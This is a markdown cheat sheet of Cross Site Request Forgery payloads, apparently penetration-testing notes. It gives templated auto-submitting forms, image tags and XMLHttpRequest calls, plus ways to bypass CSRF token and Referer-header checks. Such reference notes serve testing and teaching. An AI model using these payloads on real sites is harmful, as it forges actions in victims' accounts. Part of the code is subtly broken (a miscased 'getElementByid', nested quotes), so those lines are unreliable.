# CSRF (Cross Site Request Forgery)

## Payloads

### GET Request

```
<img src="<url>" width="0" height="0" border="0">    //no interaction required
<a href="<url>">Click me!</a>
```

### POST Request in form

```
<form id="f1" action="<url>" method="POST">
<input type="hidden" name="<arg1>" value="<value1>"/>
<input type="hidden" name="<arg2>" value="<value2>"/>
<input type="submit" value="click me"/>
</form>
<body onload="document.getElementByid("f1").submit()">
```

### Request with JSON

Requires CORS control to be configured to accept requests from all sources. `Access-Control-Allow-Origin: *`

```
<script>
function req() {
var x = new XMLHttpRequest();
x.open("<PUT|HEAD|POST>","<url>",true);
x.setRequestHeader("Content-Type", "application/json");
x.send(JSON.stringify(<JSON Object>));
}
</script>
<body onload="req()">
```

## Security Bypass

### Incorrect CSRF token validation

The following conditions may lead to a partial or complete vulnerability to CSRF attacks beacuse the security token is not managed correctly.

* The token is validated only for POST requests
* If the token is missing, the request is not invalidated
* The token is not tied to the user's session but is part of a pool of possible values thus allowing a malicious actor to harvest and reuse tokens
* The token is stored in a non-session cookie. This allows an attacker to obtain a valid session cookie by navigating to the application, intercept a valid CSRF token and forge a valid request. The request is valid because there is no check to make sure that the CSRF token actually belongs to the given session
* Double Submit: the CSRF token is sent both as a cookie and as a parameter of the request. if an attacker has the possibility to create cookies He can create an arbitrary token and then set it as an argument of the forged request and, because the requirement for a valid request is simply to have matching cookie and argument values, create a valid request

### Referer header

In order to use the following exploits it is required to include the following header in the response from the attacker's server: `Referrer-Policy: unsafe-url.` In this way the content of the Referer header will not be stripped

Referer is validated only if present. by adding the following code to the pyload it is possible to force the removal of the header

```
<meta name="referrer" content="never">
```

If the referer evaluates only the domain name it is possible to bypass the control by inserting the CSRF payload as a subdomain or as an argument of the URL

```
http://<url>/csrf-attack
```

If the referer simply searches for the domain name in any position in the URL then it can be bypassed by putting the vulnerable site's domain elsewhere

```
http://<attacker url>/crsf-attack?<vulnerable url>
```
